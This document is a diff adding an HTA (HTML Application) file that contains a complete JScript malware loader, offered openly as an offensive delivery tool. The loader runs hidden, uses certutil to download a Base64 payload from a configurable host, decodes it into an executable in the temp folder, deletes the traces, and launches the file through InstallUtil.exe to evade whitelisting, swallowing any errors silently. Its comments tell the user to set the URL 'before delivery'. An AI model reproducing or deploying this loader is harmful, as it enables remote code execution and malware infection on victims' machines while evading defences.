@@ -1,0 +1,47 @@
+<html>
+<head>
+<title> </title>
+<HTA:APPLICATION ID="loader" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
+<script language="JScript">
+// =============================================================================
+// Certutil-Method HTA Loader
+//
+// Downloads a Base64-encoded payload, decodes it with certutil, and executes
+// it via InstallUtil.exe /U. Simpler than the self-decode method but uses
+// certutil which is a monitored LOLBin.
+//
+// Configure the URL below before delivery.
+// =============================================================================
+
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var tmpDir = fso.GetSpecialFolder(2); // %TEMP%
+    var encPath = tmpDir + "\\payload.b64";
+    var exePath = tmpDir + "\\svc.exe";
+
+    // ── CONFIG: Set your payload URL ──────────────────────────────────────────
+    var payloadUrl = "http://192.168.1.1/payload.b64";
+
+    // Download the Base64-encoded payload
+    shell.Run("certutil -urlcache -f " + payloadUrl + " " + encPath, 0, true);
+
+    // Decode Base64 → binary EXE
+    shell.Run("certutil -decode " + encPath + " " + exePath, 0, true);
+
+    // Clean up the encoded file
+    try { fso.DeleteFile(encPath); } catch(e) {}
+
+    // Execute via InstallUtil /U
+    var installUtil = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe";
+    shell.Run(installUtil + " /U " + exePath, 0, false);
+
+} catch (e) {
+    // Silent fail
+}
+
+self.close();
+</script>
+</head>
+<body>Loading...</body>
+</html>
